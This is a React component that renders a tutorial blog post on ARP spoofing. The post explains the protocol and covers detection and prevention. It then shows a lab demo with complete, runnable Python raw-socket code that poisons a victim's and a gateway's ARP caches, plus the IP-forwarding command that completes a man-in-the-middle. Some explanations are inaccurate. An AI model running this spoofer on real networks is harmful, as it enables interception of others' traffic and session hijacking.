import React from "react";
function abc(){
    var copy_ele=document.getElementById("copy_text")
    document.querySelector("path").setAttribute("fill","green")
    document.querySelector("path").setAttribute("d","M9 16.17l-4.17-4.17-1.42 1.42L9 19 21.59 6.41 20.17 5")
    navigator.clipboard.writeText(copy_ele.innerText)
}
export default function ARPBlog(){
    return(
        <div id="arp-blog-mid">
            <h3><u>ARP Spoofing using Python</u></h3>
            <h4>What is ARP?</h4>
            <i>ARP stands for Address Resolution Protocol.</i>
            <p>
                ARP protocol is what makes machine-network interaction and information exchange possible. It translates the 32-bit IP(Internet Protocol) address into a 48-bit MAC(Media Access Control) address. It is similar to the function of DNS where the domain name is translated to IP and vice versa. RARP is used to translate MAC to IP.<br/>
                Unlike DNS, the ARP messages don't travel beyond the local subnet. This is due to the fact the ARP protocol works in the layer 2 switches (link layer protocol). This means the ARP Spoofing can be carried out by someone only if they are within the same network.
            </p>
            <br/>
            <h4>How does it work?</h4>
            <p>
                Data packets in the LAN have a MAC address in the ethernet header field. This address is checked by NIC (Network Interface Cord) in the device to know if the packet belongs to the device. Thus MAC address plays an important role in where the packet is being sent to.<br/>
                The host machine maintains an ARP cache(ARP table) which contains the mapping between IP and MAC.<br/>
                When a device tries to send any packet this cache is checked by sending out an ARP request. This broadcasts the packet to all devices on the network and the device which knows the MAC address sends an ARP response. The ARP cache is updated with this entry.<br/><br/>
                Steps involved in the ARP protocol:<br/>
                <ol>
                    <li>
                        ARP cache checked by using the IP as index.
                    </li>
                    <li>
                        If MAC address found then use that address.
                    </li>
                    <li>
                        If not then broadcast the ARP request packet over the network.
                    </li>
                    <li>
                        Only the machine with matching IP to MAC will respond to this request and the ARP reply packet consisting of the machine's IP and MAC is sent back.
                    </li>
                    <li>
                        The new entry is stored in the ARP cache.
                    </li>
                </ol>
            </p>
            <br/>
            <h4>How does it lead to spoofing?</h4>
            <i>It all seems so organized and well thought out, so how does this become a weak spot to let the bad people into the network?</i>
            <p>
                The ARP protocol was designed to be efficient and it did not take security into account. The main issue is that an ARP response from any device is just cached without any authentication. ARP is a stateless protocol and even responses sent when there was no request is cached. This means anyone can send replies(forged ARP replies) to compromise the ARP cache to their benefit. <br/>
                Sometimes called as ARP poisoning or  ARP poison routing, it is a type of man-in-the-middle attack that can further be used to initiate session hijacking, Distributed Denial-of-Service(DDoS) attacks, Continued packet theft and others. It causes the network traffic to be visible to the outsider.<br/>
                <blockquote><span>ARP only works in networks using IPv4 and 32-bit IP. IPv6 however uses a more secure protocol called Neighbor Discovery Protocol(NDP). This uses cryptographic keys to confirm the identity.</span></blockquote>
            </p>
            <br/>
            <h4>How is it carried out?</h4>
            <p>
                The attacker gets access to the network. Two devices (one is target and the other is the first hop router(generally DNS)) are identified. The attacker can now send forged ARP responses that cause the network traffic to be routed through the attacker. Spoofing tools like Arpspoof, Driftnet and even a simple Python script can be used to carry out the forging process.<br/>
                Now the target thinks the attacker is the router and the router thinks that the attacker is the target system. This causes a MiTM(Man-in-The-Middle) situation.<br/>
                <br/>
                <span>Steps involved in ARP spoofing:</span>
                <ol>
                    <li>
                        First a large number of falsified ARP request and reply packets are sent. This is done to overload the switch.
                    </li>
                    <li>
                        Switch is set in forwarding mode.
                    </li>
                    <li>
                        The ARP cache is now flooded with spoofed ARP responses.
                    </li>
                </ol>
            </p>
            <br/>
            <h4>How to detect ARP Spoofing</h4>
            <p>There are three ways to detect ARP Spoofing:
                <ol>
                    <li>
                        Using packet analyzers like Wireshark
                    </li>
                    <li>
                        Using other proprietary products like XArp
                    </li>
                    <li>
                        Using the CLI: <br/><span class="code">arp -a</span><br/>
                        <blockquote><span>If two IP's have same MAC address, it means the ARP cache has been compromised.</span></blockquote>
                    </li>
                </ol>
            </p>
            <br/>
            <h4>How to prevent ARP Spoofing</h4>
            <span>Some of the methods to prevent ARP Spoofing are:</span>
            <ul>
                <li>
                    Static ARP tables
                </li>
                <li>
                    Switch security
                </li>
                <li>
                    Physical security
                </li>
                <li>
                    Network isolation
                </li>
                <li>
                    Encryption(doesn't prevent but reduces damage caused by it)
                </li>
            </ul>
            <br/>
            <h3>Implementation and Demo of ARP Spoofing</h3>
            <h4>Details of target device</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/9921fa6d-5588-4238-8bcb-e94e58bdd632" alt="ifconfig_target"></img><br/><br/>
            <h4>Details of attacker device</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/538f2822-ba85-4052-8eaa-8d2163c904de" alt="ifconfig_attacker"></img><br/><br/>
            <h4>ARP Cache before spoofing</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/9ba84d20-cf3d-4c52-be17-adbcbced9421" alt="arp_before_spoofing"></img><br/><br/>
            <h4>Ping a website before spoofing</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/07d6b3db-0f44-44ce-b6c1-f09c2f3d3427" alt="ping_before_spoofing"></img>
            <h5>Target side</h5>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/9b147d53-d8da-4486-a49e-98249d0c5f04" alt="ping_before_spoofing(request)" height="350px" width="650px"></img>
            <br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/da7698f2-a0bb-45fe-bf79-3535b37b0e89" alt="ping_before_spoofing(response)" height="350px" width="650px"></img>
            <h5>Attacker side</h5>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/01792596-50bd-41a7-ae7f-f0f3d6104735" alt="ping_before_spoofing" height="350px" width="650px"></img><br/>   
            <blockquote><span>Note no packets can be seen on the attacker system</span></blockquote><br/>
            <h4>Spoofing</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/713908aa-5a5b-4cd2-ae3f-e17c4f6a1c1a" alt="spoofing_process"></img>
            <br/>
            <blockquote><span>The code uses raw sockets so the code has to be run with sudo</span></blockquote><br/>
            <h4>ARP Cache after spoofing</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/064afa75-52f8-4d30-82da-1f9d8a6b789b" alt="arp_after_spoofing"></img>
            <br/>
            <blockquote><span>Note two IP's have same MAC. This shows that ARP has been spoofed</span></blockquote><br/>
            <h4>Ping a website after spoofing</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/9d1bd0ff-697d-4e46-ab4d-ea17fdde3d26" alt="cmd of ping"></img>
            <h5>Target side</h5>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/14501a7f-9d81-435b-847d-d3ac7a7f97c9" alt="wireshark of target" height="350px" width="650px"></img>
            <br/>
            <h5>Attacker side</h5>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/7155a0e5-fb0d-4d8d-84d1-6a0d68216fe2" alt="wireshark of attacker" height="350px" width="650px"></img>
            <br/><blockquote><span>It can be seen that the ping was not successful and from the analysis on wireshark it can be noted that the request is sent and these packets are visible on attacker device also, however no response is received. This is because by default forwarding is disabled(set to 0) and the request that is sent to the attacker is not getting forwarded to the actual router.</span></blockquote><br/>
            <span>To fix this, run the following command</span>
            <br/>
            <span class="code">sudo bash -c 'echo 1 &gt; /proc/sys/net/ipv4/ip_forward'</span><br/><br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/18f1f0fb-5273-4bfa-b192-946146dfac96" alt="forwarding"></img><br/><br/>
            <h4>Let's try <span class="code">ping</span> again</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/9075a200-8a2f-410c-a4c2-595320835c53" alt="ping after forwarding"></img>
            <h4>Target side</h4>
            <span>Request Frame</span><br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/b4c587ec-69d9-4232-88cc-0811c62ec633" alt="target wireshark request after forwarding" height="350px" width="650px"></img>
            <br/>
            <span>Response Frame</span><br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/66cab882-3db4-4e3b-a038-f3e79f403b82" alt="target wireshark response after forwarding" height="350px" width="650px"></img>
            <br/>
            <blockquote><span>Note the <span class="code">Redirect Host</span> showing that there is a change in the route</span></blockquote><br/>
            <h4>Attacker side</h4>
            <span>Request Frame</span><br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/fe355f49-5242-448f-a96e-20920e2a8f91" alt="attacker wireshark request after forwarding" height="350px" width="650px"></img>
            <br/>
            <span>Response Frame</span><br/>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/31d99d54-8729-4cfb-949d-807bf823024a" alt="attacker wireshark response after forwarding" height="350px" width="650px"></img>
            <br/><blockquote><span>It can be noted that after setting forwarding to true there is a redirection in the packet's route and now all the packets are sent and received through the attacker and the attacker has complete access to the network's traffic.</span></blockquote><br/><br/>
            
            <h4>Visual Representation</h4>
            <img src="https://github.com/QubitMatrix/QubitMatrix/assets/60323193/ad765566-5cf3-4137-afc9-26398ec6f343" alt="arp spoofing visual" height="300px" width="600px"></img><br/><br/>
            <br/>
            
            <h4>Source Code</h4>
            
        <pre class="source_code" id="copy_text">
            <svg id="copy_svg" onClick={abc} height="24" width="24" viewBox="0 0 24 24">
                <path fill="white" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25ZM5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
            </svg>
            {
            `
import socket
import struct
import binascii

s=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)) #0800 represents IP protocol
s.bind(("eth0",socket.htons(0x0800)))

attacker_mac=bytes('\\x00\\x0c\\x29\\xcc\\xd4\\x9b',encoding="raw_unicode_escape")
victim_mac=bytes('\\x00\\x0c\\x29\\xe1\\x5b\\xe7',encoding="raw_unicode_escape")
gateway_mac=bytes('\\x00\\x50\\x56\\xec\\x6e\\x54',encoding="raw_unicode_escape") #arp -a <gateway(dns) ip>

code=bytes('\\x08\\x06',encoding="raw_unicode_escape")  #0806 indicates ARP protocol type

eth1=victim_mac+attacker_mac+code
eth2=gateway_mac+attacker_mac+code
# creates ethernet packets(eth1 for victim, eth2 for gateway)

htype=bytes('\\x00\\x01',encoding="raw_unicode_escape") #represents hardware address type (here ethernet)
protype=bytes('\\x08\\x00',encoding="raw_unicode_escape") #represents protocol type (here IPv4)
hsize=bytes('\\x06',encoding="raw_unicode_escape") #size of hardware address(6 bytes)
psize=bytes('\\x04',encoding="raw_unicode_escape") #size of protocol(4 bytes)
opcode=bytes('\\x00\\x02',encoding="raw_unicode_escape") #type of ARP message(here ARP reply message)

gateway_ip='192.168.182.2' #cat /etc/resolv.conf (on target)
victim_ip='192.168.182.131'

gateway_ip1=socket.inet_aton(gateway_ip)
victim_ip1=socket.inet_aton(victim_ip)

victim_ARP=eth1+htype+protype+hsize+psize+opcode+attacker_mac+gateway_ip1+victim_mac+victim_ip1
gateway_ARP=eth2+htype+protype+hsize+psize+opcode+attacker_mac+victim_ip1+gateway_mac+gateway_ip1

print("Spoofing started...")
while(1):
    s.send(victim_ARP) #sent to victim
    s.send(gateway_ARP) #sent to gateway
# these two trick the victim and gateway to think that the attacker is the source of network traffic
            `
            }
            </pre>
            <ul>
                <li>
                    <span class="code">socket.socket</span> creates a socket through which the information can be sent out and received.
                </li><br/>
                <li>
                    <span class="code">socket.SOCK_RAW</span> is an argument used to specify that raw sockets will be used.(This requires root privilage)
                </li><br/>
                <li>
                    <span class="code">socket.htons</span> converts a 16-bit host byte order into a network byte order.
                </li><br/>
                <li>
                    <span class="code">socket.inet_aton</span> converts an IPv4 address string into a 32-bit packed binary format.(socket.inet_pton can be used for IPv6 addresses)
                </li>
            </ul>
            <blockquote><span>To carry out spoofing the attacker needs to get into the network and identify two devices. Here the target and its local DNS is used.</span><br/><br/>
            <span>To get the IP of the local DNS check the <span class="code">/etc/resolv.conf</span> file, with the IP its MAC can be found by running <span class="code">arp -a &lt;IP&gt;</span></span></blockquote>
        </div>

    )
}